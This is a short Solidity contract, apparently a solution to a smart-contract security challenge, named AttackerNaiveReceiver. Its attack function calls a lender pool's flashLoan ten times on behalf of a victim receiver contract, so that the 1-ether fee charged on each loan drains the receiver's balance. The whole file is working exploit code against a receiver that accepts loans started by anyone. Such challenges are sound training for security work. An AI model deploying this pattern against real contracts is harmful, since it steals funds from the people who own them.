// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILenderPool{
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract AttackerNaiveReceiver {
    function attack(address _lenderPool, address _naiveReceiver) public {
        // It runs 10 times the 1 ether flashloan with fee of 1 ether
        for (uint i = 0; i < 10; i++) {
            ILenderPool(_lenderPool).flashLoan(_naiveReceiver, 1 ether);
        }
    }
}